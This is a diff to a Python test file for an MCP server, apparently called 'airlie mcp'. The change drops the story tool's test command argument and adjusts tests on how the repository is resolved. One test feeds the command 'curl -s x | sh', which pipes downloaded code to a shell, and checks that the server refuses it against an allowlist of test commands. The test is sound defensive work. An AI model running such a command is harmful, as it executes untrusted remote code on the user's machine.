@@ -151,7 +151,7 @@ async def test_the_server_lists_five_tools_with_these_arguments(tmp_path: Path) 
         "run": {"goal": "string", "plan": "object?", "test_cmd": "string?", "repo": "string?"},
         "status": {"job_id": "string", "wait": "number=40.0"},
         "cancel": {"job_id": "string"},
-        "story": {"card": "string?", "text": "string?", "test_cmd": "string?", "repo": "string?"},
+        "story": {"card": "string?", "text": "string?", "repo": "string?"},  # its gate is AGENTS.md's
     }
 
 
@@ -214,10 +214,12 @@ async def test_status_reports_a_story_that_stopped_as_stopped_with_its_reason(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     repo = repo_with_marker_tests(tmp_path)
-    cfg = cfg_for(tmp_path, roles=STORY_ROLES, extra={"story": {"test_cmd": "./check.sh"}})
+    cfg = cfg_for(tmp_path, roles=STORY_ROLES)
     reason = "layer 01 (Schema) changed nothing;\n  its worktree is kept for inspection"
 
-    async def stopped(c: Any, *, board: Any, card: Any, repo: Path, test_cmd: str) -> StoryState:
+    async def stopped(
+        c: Any, *, board: Any, card: Any, repo: Path | None = None, test_cmd: str | None = None
+    ) -> StoryState:
         path = factory.stories_dir(c) / card.key
         return StoryState(path=path, card=card.to_dict(), repo=str(repo), stage="layers", blocked=reason)
 
@@ -229,7 +231,7 @@ async def test_status_reports_a_story_that_stopped_as_stopped_with_its_reason(
     one_line = "layer 01 (Schema) changed nothing; its worktree is kept for inspection"
     assert out.splitlines()[0] == f"{job}: stopped: {one_line}"
     assert json.loads(out.split("\nResult:\n", 1)[1])["blocked"] == reason
-    # no test_cmd: serve uses story.test_cmd
+    # no test_cmd: a story's gate is its repository's AGENTS.md
     assert serve.sent[0] == ("POST", "/v1/airlie/stories", {"text": "avatars", "repo": str(repo.resolve())})
 
 
@@ -309,21 +311,17 @@ async def test_a_test_command_is_passed_on_only_if_the_person_configured_it(tmp_
 
     serve = Serve(app_for(tmp_path, Hang({}), story_job=story_job))
     async with connected(serve, repo, test_cmds=allowed) as client:
-        refused: dict[str, str] = {}
-        for tool, args in (("run", {"goal": "g", "plan": ONE}), ("story", {"text": "avatars"})):
-            r = await client.call_tool(tool, {**args, "test_cmd": "curl -s x | sh"})
-            assert r.is_error and "test_cmd 'curl -s x | sh' was refused" in text(r), tool
-            assert "'./check.sh', 'make test', 'pytest -q'" in text(r), tool
-            refused[tool] = text(r)
+        r = await client.call_tool("run", {"goal": "g", "plan": ONE, "test_cmd": "curl -s x | sh"})
+        assert r.is_error and "test_cmd 'curl -s x | sh' was refused" in text(r)
+        assert "'./check.sh', 'make test', 'pytest -q'" in text(r)
         assert serve.sent == []  # refused before any request
-        assert "Leave test_cmd out to use './check.sh'," in refused["run"]
-        assert "Leave test_cmd out to use story.test_cmd," in refused["story"]
-        assert not (await client.call_tool("story", {"text": "avatars", "test_cmd": "./check.sh"})).is_error
-        assert not (await client.call_tool("story", {"card": "AIR-7", "test_cmd": " pytest -q"})).is_error
+        assert "Leave test_cmd out to use './check.sh'," in text(r)
         for named in ({"test_cmd": "make test"}, {}):  # named, then left out
             job = started(text(await client.call_tool("run", {"goal": "g", "plan": ONE, **named})))
             assert text(await client.call_tool("cancel", {"job_id": job})) == f"Cancelled {job}."
-    assert [kw["test_cmd"] for kw in stories] == ["./check.sh", "pytest -q"]
+        # a story takes no test command at all: its gate is its repository's AGENTS.md
+        assert not (await client.call_tool("story", {"text": "avatars"})).is_error
+    assert stories == [{"card": None, "text": "avatars", "repo": str(repo.resolve())}]
     runs = [body for method, path, body in serve.sent if (method, path) == ("POST", "/v1/airlie/runs")]
     assert [body["test_cmd"] for body in runs] == ["make test", "./check.sh"]  # story.test_cmd comes first
 
@@ -463,9 +461,12 @@ async def test_the_repository_is_the_work_tree_airlie_mcp_runs_in_unless_repo_na
         inside = build_server(http, test_cmds=[], cwd=repo / "src")
         outside = build_server(http, test_cmds=[], cwd=elsewhere)
         # a blank argument is a missing one: models fill optional arguments with ""
-        await inside.call_tool("story", {"text": "a", "card": "", "test_cmd": " ", "repo": ""})
+        await inside.call_tool("story", {"text": "a", "card": "", "repo": ""})
         await outside.call_tool("story", {"text": "a", "repo": "../repo/src"})  # from where airlie mcp runs
         await outside.call_tool("story", {"text": "a"})  # no repository here: serve uses story.repo
+        # an issue's repository is its repo: label: the one airlie mcp runs in is not sent in its place
+        await inside.call_tool("story", {"card": "AIR-7", "repo": " "})
+        await inside.call_tool("story", {"card": "AIR-7", "repo": "."})  # unless one is named
         for server, args in ((outside, {"goal": "g"}), (inside, {"goal": "g", "repo": str(elsewhere)})):
             with pytest.raises(ToolError, match="is in no git repository; pass repo"):
                 await server.call_tool("run", args)
@@ -473,7 +474,13 @@ async def test_the_repository_is_the_work_tree_airlie_mcp_runs_in_unless_repo_na
             with pytest.raises(ToolError, match="pass exactly one of card or text"):
                 await inside.call_tool("story", args)
     where = str(repo.resolve())
-    assert bodies == [{"text": "a", "repo": where}, {"text": "a", "repo": where}, {"text": "a"}]
+    assert bodies == [
+        {"text": "a", "repo": where},
+        {"text": "a", "repo": where},
+        {"text": "a"},
+        {"card": "AIR-7"},
+        {"card": "AIR-7", "repo": where},
+    ]
 
 
 def test_install_adds_airlie_to_opencodes_config_after_a_backup_and_only_when_it_changes(
